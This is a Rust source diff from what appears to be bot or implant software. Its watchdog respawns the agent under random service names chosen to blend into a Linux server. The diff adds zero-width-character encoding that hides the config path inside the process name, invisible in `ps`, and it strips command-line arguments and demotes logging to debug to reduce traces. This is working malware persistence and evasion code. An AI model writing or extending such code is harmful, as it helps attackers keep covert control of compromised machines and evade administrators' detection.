@@ -29,6 +29,8 @@ use std::process::Command;
 use std::time::Duration;
 use tracing::{debug, info, warn};
 
+use arcticfox_core::zwcodec;
+
 // ── Common Service Name Pool ────────────────────────────────────────────────
 
 /// Process names that blend into a typical Linux server.
@@ -114,21 +116,21 @@ const PID_FILE_PATHS: &[&str] = &[
 /// Pick a random service name from the pool.
 pub fn random_service_name() -> &'static str {
     use rand::Rng;
-    let idx = rand::thread_rng().r#gen_range(0..SERVICE_NAMES.len());
+        let idx = rand::thread_rng().gen_range(0..SERVICE_NAMES.len());
     SERVICE_NAMES[idx]
 }
 
 /// Pick a random bot ID from the pool (blends as hostname).
 pub fn random_bot_id() -> &'static str {
     use rand::Rng;
-    let idx = rand::thread_rng().r#gen_range(0..BOT_ID_POOL.len());
+    let idx = rand::thread_rng().gen_range(0..BOT_ID_POOL.len());
     BOT_ID_POOL[idx]
 }
 
 /// Pick a random PID file path.
 pub fn random_pid_path() -> &'static str {
     use rand::Rng;
-    let idx = rand::thread_rng().r#gen_range(0..PID_FILE_PATHS.len());
+    let idx = rand::thread_rng().gen_range(0..PID_FILE_PATHS.len());
     PID_FILE_PATHS[idx]
 }
 
@@ -183,20 +185,33 @@ pub fn spawn_watchdog(
     agent_path: PathBuf,
     config_path: PathBuf,
 ) -> std::io::Result<()> {
+    // Embed config path as ZW in stealth name — not as separate CLI arg
+    let zw_name = zw_stealth_name(random_service_name(), config_path.to_string_lossy().as_bytes());
     let child = Command::new(&agent_path)
         .arg("watchdog")
-        .arg("--parent-pid")
+        .arg("--ppid")
         .arg(parent_pid.to_string())
-        .arg("--config")
-        .arg(&config_path)
         .arg("--daemon")
+        .arg("--name")
+        .arg(&zw_name)
         .stdin(std::process::Stdio::null())
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
         .spawn()?;
 
-    info!("Watchdog spawned: PID {} (parent={})", child.id(), parent_pid);
+    debug!("Watchdog spawned: PID {}", child.id());
     Ok(())
+}
+
+/// Build a stealth name string with ZW-encoded data invisibly appended.
+/// `ps` shows only the visible name; the ZW suffix carries hidden data.
+pub fn zw_stealth_name(visible: &str, hidden_data: &[u8]) -> String {
+    format!("{}{}", visible, zwcodec::encode(hidden_data))
+}
+
+/// Extract ZW-hidden data from a stealth name string.
+pub fn extract_zw_data(combined: &str) -> Option<Vec<u8>> {
+    zwcodec::decode(combined).ok()
 }
 
 /// Watchdog main loop — monitors parent PID, respawns on death.
@@ -205,7 +220,7 @@ pub async fn watchdog_loop(
     agent_path: PathBuf,
     config_path: PathBuf,
 ) {
-    info!("Watchdog started: monitoring PID {}", parent_pid);
+    info!("Watchdog started");
 
     let mut current_name = random_service_name();
     camouflage_process_name(current_name);
@@ -227,14 +242,13 @@ pub async fn watchdog_loop(
                 current_name = random_service_name();
             }
 
-            // Respawn the agent under a new name
+            // Respawn with ZW-encoded config in stealth name — no separate --config arg
+            let zw_name = zw_stealth_name(current_name, config_path.to_string_lossy().as_bytes());
             let child = Command::new(&agent_path)
                 .arg("agent")
-                .arg("--config")
-                .arg(&config_path)
                 .arg("--daemon")
-                .arg("--stealth-name")
-                .arg(current_name)
+                .arg("--name")
+                .arg(&zw_name)
                 .stdin(std::process::Stdio::null())
                 .stdout(std::process::Stdio::null())
                 .stderr(std::process::Stdio::null())
@@ -243,12 +257,7 @@ pub async fn watchdog_loop(
             match child {
                 Ok(c) => {
                     respawn_count += 1;
-                    info!(
-                        "Respawned as PID {} (name='{}', respawn #{})",
-                        c.id(),
-                        current_name,
-                        respawn_count
-                    );
+                    debug!("Respawn {} as PID {}", respawn_count, c.id());
                     // Become the watchdog for the new child
                     // The new child will spawn its own watchdog
                     // We exit — let the new child's watchdog take over
@@ -261,7 +270,7 @@ pub async fn watchdog_loop(
         }
     }
 
-    info!("Watchdog exiting after respawn");
+    debug!("Watchdog exiting after respawn");
 }
 
 // ── Helpers ─────────────────────────────────────────────────────────────────
